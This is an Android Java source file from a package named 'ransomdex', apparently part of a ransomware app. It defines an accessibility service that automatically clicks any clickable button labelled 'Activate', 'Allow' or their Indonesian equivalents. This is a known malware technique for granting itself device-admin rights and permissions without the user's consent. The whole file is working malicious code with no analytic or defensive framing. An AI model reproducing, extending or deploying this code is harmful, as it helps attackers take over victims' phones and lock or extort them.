package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class CustomAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getSource() == null) return;

        // Logika "Auto-Clicker"
        // Mencari tombol dengan teks tertentu (tergantung bahasa sistem)
        checkAndClick(event.getSource(), "Activate");
        checkAndClick(event.getSource(), "Aktifkan");
        checkAndClick(event.getSource(), "Allow");
        checkAndClick(event.getSource(), "Izinkan");
    }

    private void checkAndClick(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo n : nodes) {
                if (n.isClickable()) {
                    n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    n.recycle();
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}
}